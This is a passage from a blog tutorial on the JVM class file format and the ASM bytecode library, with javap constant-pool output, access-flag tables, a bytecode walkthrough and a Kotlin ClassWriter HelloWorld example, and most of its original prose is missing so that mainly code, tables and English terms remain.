invokestatic  #3                  &#x2F;&#x2F; Method sum:(II)I\n        14: invokevirtual #4                  &#x2F;&#x2F; Method java&#x2F;io&#x2F;PrintStream.println:(I)V\n        17: return\n      LineNumberTable:\n        line 12: 0\n        line 13: 2\n        line 14: 6\n        line 15: 17\n      LocalVariableTable:\n        Start  Length  Slot  Name   Signature\n            0      18     0  args   [Ljava&#x2F;lang&#x2F;String;\n            2      16     1     a   I\n            6      12     2     b   I\n&#125;\nSourceFile: &quot;TestClazz.java&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"-amp-Class\"><a href=\"#-amp-Class\" class=\"headerlink\" title=\" &amp; Class\"></a> &amp; Class</h4><p>class4Byte(Magic Number), classByteclass<code>0xCAFE BABE</code>Java:)</p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/aZx0S4EjfY.jpg\" alt=\"aZx0S4EjfY\"></p>\n<p><img src=\"https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/%E9%A3%9E%E4%B9%A620220709-173350.jpg\" alt=\"20220709-173350\"></p>\n<p>7341652Java8</p>\n<p>56Minor Version,78Major VersionJava45JDK1.1JDK+1JDKClassClass</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">Constant pool:\n   #1 &#x3D; Methodref          #8.#27         &#x2F;&#x2F; java&#x2F;lang&#x2F;Object.&quot;&lt;init&gt;&quot;:()V\n   #2 &#x3D; Fieldref           #28.#29        &#x2F;&#x2F; java&#x2F;lang&#x2F;System.out:Ljava&#x2F;io&#x2F;PrintStream;\n   #3 &#x3D; Methodref          #7.#30         &#x2F;&#x2F; kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz.sum:(II)I\n   #4 &#x3D; Methodref          #31.#32        &#x2F;&#x2F; java&#x2F;io&#x2F;PrintStream.println:(I)V\n   #5 &#x3D; String             #33            &#x2F;&#x2F; execute sum function.\n   #6 &#x3D; Methodref          #31.#34        &#x2F;&#x2F; java&#x2F;io&#x2F;PrintStream.println:(Ljava&#x2F;lang&#x2F;String;)V\n   #7 &#x3D; Class              #35            &#x2F;&#x2F; kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz\n   #8 &#x3D; Class              #36            &#x2F;&#x2F; java&#x2F;lang&#x2F;Object\n   #9 &#x3D; Utf8               &lt;init&gt;\n  #10 &#x3D; Utf8               ()V\n  #11 &#x3D; Utf8               Code\n  #12 &#x3D; Utf8               LineNumberTable\n  #13 &#x3D; Utf8               LocalVariableTable\n  #14 &#x3D; Utf8               this\n  #15 &#x3D; Utf8               Lkim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz;\n  #16 &#x3D; Utf8               main\n  #17 &#x3D; Utf8               ([Ljava&#x2F;lang&#x2F;String;)V\n  #18 &#x3D; Utf8               args\n  #19 &#x3D; Utf8               [Ljava&#x2F;lang&#x2F;String;\n  #20 &#x3D; Utf8               a\n  #21 &#x3D; Utf8               I\n  #22 &#x3D; Utf8               b\n  #23 &#x3D; Utf8               sum\n  #24 &#x3D; Utf8               (II)I\n  #25 &#x3D; Utf8               SourceFile\n  #26 &#x3D; Utf8               TestClazz.java\n  #27 &#x3D; NameAndType        #9:#10         &#x2F;&#x2F; &quot;&lt;init&gt;&quot;:()V\n  #28 &#x3D; Class              #37            &#x2F;&#x2F; java&#x2F;lang&#x2F;System\n  #29 &#x3D; NameAndType        #38:#39        &#x2F;&#x2F; out:Ljava&#x2F;io&#x2F;PrintStream;\n  #30 &#x3D; NameAndType        #23:#24        &#x2F;&#x2F; sum:(II)I\n  #31 &#x3D; Class              #40            &#x2F;&#x2F; java&#x2F;io&#x2F;PrintStream\n  #32 &#x3D; NameAndType        #41:#42        &#x2F;&#x2F; println:(I)V\n  #33 &#x3D; Utf8               execute sum function.\n  #34 &#x3D; NameAndType        #41:#43        &#x2F;&#x2F; println:(Ljava&#x2F;lang&#x2F;String;)V\n  #35 &#x3D; Utf8               kim&#x2F;bifrost&#x2F;rain&#x2F;ksp&#x2F;TestClazz\n  #36 &#x3D; Utf8               java&#x2F;lang&#x2F;Object\n  #37 &#x3D; Utf8               java&#x2F;lang&#x2F;System\n  #38 &#x3D; Utf8               out\n  #39 &#x3D; Utf8               Ljava&#x2F;io&#x2F;PrintStream;\n  #40 &#x3D; Utf8               java&#x2F;io&#x2F;PrintStream\n  #41 &#x3D; Utf8               println\n  #42 &#x3D; Utf8               (I)V\n  #43 &#x3D; Utf8               (Ljava&#x2F;lang&#x2F;String;)V<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>ClassClass</p>\n<p>1</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_Utf8_info</td>\n<td align=\"center\">1</td>\n<td align=\"center\">UTF-8</td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Integer_info</td>\n<td align=\"center\">3</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Class_info</td>\n<td align=\"center\">7</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_String_info</td>\n<td align=\"center\">8</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Fieldref_info</td>\n<td align=\"center\">9</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_Methodref_info</td>\n<td align=\"center\">10</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_MethodType_info</td>\n<td align=\"center\">16</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">CONSTANT_NameAndType_info</td>\n<td align=\"center\">12</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<p></p>\n<p><code>CONSTANT_Methodref_info</code>Java 222</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_Methodref_info</td>\n<td align=\"center\">tag</td>\n<td align=\"center\">u1</td>\n<td align=\"center\">10</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">CONSTANT_Class_info</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\">CONSTANT_NameAndType_info</td>\n</tr>\n</tbody></table>\n<p><code>CONSTANT_Class_info</code><code>CONSTANT_NameAndType_info</code></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_Class_info</td>\n<td align=\"center\">tag</td>\n<td align=\"center\">u1</td>\n<td align=\"center\">7</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<table>\n<thead>\n<tr>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n<th align=\"center\"></th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">CONSTANT_NameAndType_info</td>\n<td align=\"center\">tag</td>\n<td align=\"center\">u1</td>\n<td align=\"center\">12</td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\"></td>\n<td align=\"center\">index</td>\n<td align=\"center\">u2</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<h5 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h5><p>sumNameAndType</p>\n<blockquote>\n<p>#30 &#x3D; NameAndType        #23:#24        &#x2F;&#x2F; sum:(II)I</p>\n</blockquote>\n<p>#23<code>sum</code>#24<code>(II)I</code></p>\n<p>(II)IIintIint</p>\n<p>:</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gzno2stssaj216i08mjsr.jpg\" alt=\"image-20220223192518999\"></p>\n<p><code>()V</code>void</p>\n<p>:</p>\n<blockquote>\n<p>public Set<ArathothAttribute> getAttrInstSet()</p>\n<p>()Ljava&#x2F;util&#x2F;Set&lt;ink&#x2F;rainbowbridge&#x2F;v1&#x2F;arathoth&#x2F;attribute&#x2F;abstracts&#x2F;ArathothAttribute;&gt;;</p>\n<p></p>\n<p></p>\n</blockquote>\n<blockquote>\n<p>public Double getRandom(Double value1, Double value2)</p>\n<p>(Ljava&#x2F;lang&#x2F;Double;Ljava&#x2F;lang&#x2F;Double;)Ljava&#x2F;lang&#x2F;Double;</p>\n<p></p>\n<p></p>\n<p>public double sum(Double value1, double value2) {</p>\n<p>\t\treturn value1 + value2;</p>\n<p>}</p>\n<p>:), value1doubleValue()</p>\n<p>java</p>\n</blockquote>\n<blockquote>\n<p></p>\n<p>public double[] getRandomNums()</p>\n<p>()[D</p>\n<p>[</p>\n</blockquote>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">flags: ACC_PUBLIC, ACC_SUPER<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>&#x2F;&#x2F;</p>\n<p>:</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznp9glonej216i0hcjui.jpg\" alt=\"image-20220223200619811\"></p>\n<p>:</p>\n<p><img src=\"https://tva1.sinaimg.cn/large/e6c9d24ely1gznpe7is4wj21620eswh4.jpg\" alt=\"image-20220223201053780\"></p>\n<p>:</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ACC_PUBLIC</td>\n<td>0x0001</td>\n<td>public</td>\n</tr>\n<tr>\n<td>ACC_PRIVATE</td>\n<td>0x0002</td>\n<td>private</td>\n</tr>\n<tr>\n<td>ACC_PROTECTED</td>\n<td>0x0004</td>\n<td>protected</td>\n</tr>\n<tr>\n<td>ACC_STATIC</td>\n<td>0x0008</td>\n<td>static</td>\n</tr>\n<tr>\n<td>ACC_FINAL</td>\n<td>0x0010</td>\n<td>final</td>\n</tr>\n<tr>\n<td>ACC_SYNCHRONIZED</td>\n<td>0x0020</td>\n<td>synchronized</td>\n</tr>\n<tr>\n<td>ACC_BRIDGE</td>\n<td>0x0040</td>\n<td></td>\n</tr>\n<tr>\n<td>ACC_VARARGS</td>\n<td>0x0080</td>\n<td></td>\n</tr>\n<tr>\n<td>ACC_NATIVE</td>\n<td>0x0100</td>\n<td>native</td>\n</tr>\n<tr>\n<td>ACC_ABSTRACT</td>\n<td>0x0400</td>\n<td>abstract</td>\n</tr>\n<tr>\n<td>ACC_STRICT</td>\n<td>0x0800</td>\n<td>strictfp</td>\n</tr>\n<tr>\n<td>ACC_SYNTHETIC</td>\n<td>0x1000</td>\n<td></td>\n</tr>\n</tbody></table>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><blockquote>\n<p>ASM</p>\n</blockquote>\n<p><strong></strong><strong></strong>main</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> b <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">+</span> a<span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token function\">sum</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre><code>Code:\n  stack=3, locals=3, args_size=1\n     0: iconst_1\n     1: istore_1\n     2: iconst_2\n     3: iload_1\n     4: iadd\n     5: istore_2\n     6: getstatic     #2                  // Field java/lang/System.out:Ljava/io/PrintStream;\n     9: iload_1\n    10: iload_2\n    11: invokestatic  #3                  // Method sum:(II)I\n    14: invokevirtual #4                  // Method java/io/PrintStream.println:(I)V\n    17: return\n</code></pre>\n<hr>\n<blockquote>\n<p>iconst_1</p>\n</blockquote>\n<p>int<code>1</code><strong></strong>, 1<code>int a = 1</code>1</p>\n<blockquote>\n<p>istore_1</p>\n</blockquote>\n<p>int<strong></strong>1<code>1</code><code>int a = 1</code></p>\n<blockquote>\n<p>iconst_2</p>\n</blockquote>\n<p>int<code>2</code><strong></strong>2 <code>int b = 2 + a</code>2</p>\n<blockquote>\n<p>iload_1</p>\n</blockquote>\n<p>int<strong></strong>1<code>a</code></p>\n<blockquote>\n<p>iadd</p>\n</blockquote>\n<p><strong></strong>int<strong></strong><code>int b = 2 + a</code></p>\n<blockquote>\n<p>istore_2</p>\n</blockquote>\n<p>int<strong></strong><strong></strong>2<code>int b = 2 + a</code></p>\n<blockquote>\n<p>getstatic     #2                  &#x2F;&#x2F; Field java&#x2F;lang&#x2F;System.out:Ljava&#x2F;io&#x2F;PrintStream;</p>\n</blockquote>\n<p><code>System.out</code>, <code>Ljava/io/PrintStream</code>,<strong></strong><code>#2</code><code>Field java/lang/System.out:Ljava/io/PrintStream;</code></p>\n<blockquote>\n<p>iload_1</p>\n</blockquote>\n<p>int<code>a</code><strong></strong></p>\n<blockquote>\n<p>iload_2</p>\n</blockquote>\n<p>intb<strong></strong></p>\n<blockquote>\n<p>invokestatic  #3                  &#x2F;&#x2F; Method sum:(II)I</p>\n</blockquote>\n<p>intint</p>\n<blockquote>\n<p>invokevirtual #4                  &#x2F;&#x2F; Method java&#x2F;io&#x2F;PrintStream.println:(I)V</p>\n</blockquote>\n<p><code>PrintStream#println</code>receiverjavakotlinreceiver</p>\n<blockquote>\n<p>return</p>\n</blockquote>\n<p>void</p>\n<hr>\n<p><strong></strong></p>\n<p>jvm</p>\n<p>:)</p>\n<h3 id=\"ASM\"><a href=\"#ASM\" class=\"headerlink\" title=\"ASM\"></a>ASM</h3><p>ASM&#x2F;Javassist&#x2F;cglib&#x2F;?</p>\n<ul>\n<li>&#x2F; gradlegradleshadowJar(relocate))</li>\n<li>InvocationHandler</li>\n<li>asm</li>\n<li>jvm<a href=\"https://github.com/MeiVinEight/ReflectionFX\">MeiVinEight&#x2F;ReflectionFX: Reflection Toolkit (github.com)</a>MethodHandle</li>\n</ul>\n<p></p>\n<p>androiddex</p>\n<p>asmjdkasmasm</p>\n<h4 id=\"ASM-Core-API-amp-Tree-API\"><a href=\"#ASM-Core-API-amp-Tree-API\" class=\"headerlink\" title=\"ASM Core API &amp; Tree API\"></a>ASM Core API &amp; Tree API</h4><h5 id=\"Core-API\"><a href=\"#Core-API\" class=\"headerlink\" title=\"Core API\"></a>Core API</h5><p>ASM ASMJar&#x2F;class&#x2F;&#x2F;ASM() kapt&#x2F;kspasm, kapt&#x2F;kspasm</p>\n<p><a href=\"https://www.runoob.com/design-pattern/visitor-pattern.html\"> |  (runoob.com)</a></p>\n<p>:</p>\n<p>ASMclassAPI</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ClassVisitor</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">visit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> version<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> access<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> signature<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> superName<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> interfaces<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">FieldVisitor</span> <span class=\"token function\">visitField</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> access<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> desc<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> signature<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">MethodVisitor</span> <span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> access<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> desc<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> signature<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> exceptions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>ClassVisitor</p>\n<blockquote>\n<h6 id=\"1void-visit-int-version-int-access-String-name-String-signature-String-superName-String-interfaces\"><a href=\"#1void-visit-int-version-int-access-String-name-String-signature-String-superName-String-interfaces\" class=\"headerlink\" title=\"1void visit(int version, int access, String name, String signature, String superName, String[] interfaces)\"></a>1void visit(int version, int access, String name, String signature, String superName, String[] interfaces)</h6><p>class</p>\n<p>versionclass</p>\n<p>access </p>\n<p>name</p>\n<p>signatureclassnull</p>\n<p>superName</p>\n<p>interfaces</p>\n<h6 id=\"2void-visitAnnotation-String-descriptor-boolean-visible\"><a href=\"#2void-visitAnnotation-String-descriptor-boolean-visible\" class=\"headerlink\" title=\"2void visitAnnotation(String descriptor, boolean visible)\"></a>2void visitAnnotation(String descriptor, boolean visible)</h6><p>class</p>\n<p>descriptor</p>\n<p>visible</p>\n<h6 id=\"3FieldVisitor-visitField-int-access-String-name-String-descriptor-String-signature-Object-value\"><a href=\"#3FieldVisitor-visitField-int-access-String-name-String-descriptor-String-signature-Object-value\" class=\"headerlink\" title=\"3FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)\"></a>3FieldVisitor visitField(int access, String name,String descriptor, String signature,Object value)</h6><p>classFieldVisitor</p>\n<p>name</p>\n<p>descriptor</p>\n<p>value</p>\n<p><code>Integer</code><code>Float</code><code>Long</code><code>Double</code><code>String</code><code>int</code><code>float</code><code>long</code> <code>String</code><em></em>null</p>\n<h6 id=\"4MethodVisitor-visitMethod-int-access-String-name-String-descriptor-String-signature-String-exceptions\"><a href=\"#4MethodVisitor-visitMethod-int-access-String-name-String-descriptor-String-signature-String-exceptions\" class=\"headerlink\" title=\"4MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)\"></a>4MethodVisitor visitMethod(int access,String name,String descriptor,String signature, String[] exceptions)</h6><p>classMethodVisitor</p>\n<p>name</p>\n<p>descriptor</p>\n<p>signature</p>\n<p>exceptions</p>\n<h6 id=\"5visitInnerClass-String-name-String-outerName-String-innerName-int-access\"><a href=\"#5visitInnerClass-String-name-String-outerName-String-innerName-int-access\" class=\"headerlink\" title=\"5visitInnerClass(String name, String outerName, String innerName, int access)\"></a>5visitInnerClass(String name, String outerName, String innerName, int access)</h6><p>class<strong></strong><strong></strong></p>\n<p>name<code>com/hebaibai/example/demo/Aoo$1XX</code></p>\n<p>outerName</p>\n<p>innerName</p>\n<h6 id=\"6visitOuterClass-String-owner-String-name-String-descriptor\"><a href=\"#6visitOuterClass-String-owner-String-name-String-descriptor\" class=\"headerlink\" title=\"6visitOuterClass(String owner, String name, String descriptor)\"></a>6visitOuterClass(String owner, String name, String descriptor)</h6><p></p>\n<p>classvisitInnerClass<code>com/hebaibai/example/demo/Aoo$1</code><code>com/hebaibai/example/demo/Aoo$1XX</code></p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">ClassReader classReader <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ClassReader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"com/hebaibai/example/demo/Aoo$1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DemoClassVisitor</span><span class=\"token punctuation\">(</span>Opcodes<span class=\"token punctuation\">.</span><span class=\"token constant\">ASM7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ClassReader<span class=\"token punctuation\">.</span><span class=\"token constant\">SKIP_CODE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p></p>\n<p></p>\n<p>ownerclass</p>\n<p>namenull</p>\n<p>descriptor</p>\n</blockquote>\n<p>ClassVisitorClassVisitorMethodVistitor&#x2F;FieldVisitor)</p>\n<p>ClassWritervisitHelloWorld</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">visit</span><span class=\"token punctuation\">(</span>\n        V1_8<span class=\"token punctuation\">,</span>\n        ACC_PUBLIC <span class=\"token operator\">+</span> ACC_SUPER<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"org/example/asmlearn/ASMLearn_Test\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"java/lang/Object\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> mv <span class=\"token operator\">=</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>\n        ACC_PUBLIC <span class=\"token operator\">+</span> ACC_STATIC<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">\"([Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n        <span class=\"token keyword\">null</span>\n    <span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitFieldInsn</span><span class=\"token punctuation\">(</span>GETSTATIC<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/lang/System\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"out\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Ljava/io/PrintStream;\"</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitLdcInsn</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello, World!\"</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>INVOKEVIRTUAL<span class=\"token punctuation\">,</span> <span class=\"token string\">\"java/io/PrintStream\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"println\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"(Ljava/lang/String;)V\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitInsn</span><span class=\"token punctuation\">(</span>RETURN<span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitMaxs</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    mv<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">visitEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> byteArray <span class=\"token operator\">=</span> classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classLoader <span class=\"token operator\">=</span> <span class=\"token function\">MyClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> clazz <span class=\"token operator\">=</span> classLoader<span class=\"token punctuation\">.</span><span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"org.example.asmlearn.ASMLearn_Test\"</span><span class=\"token punctuation\">,</span> byteArray<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> m <span class=\"token operator\">=</span> clazz<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">,</span> Array<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">></span><span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">)</span>\n    m<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token function\">arrayOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> MyClassLoader <span class=\"token operator\">:</span> <span class=\"token function\">ClassLoader</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span> b<span class=\"token operator\">:</span> ByteArray<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Class<span class=\"token operator\">&lt;</span><span class=\"token operator\">*</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">defineClass</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token 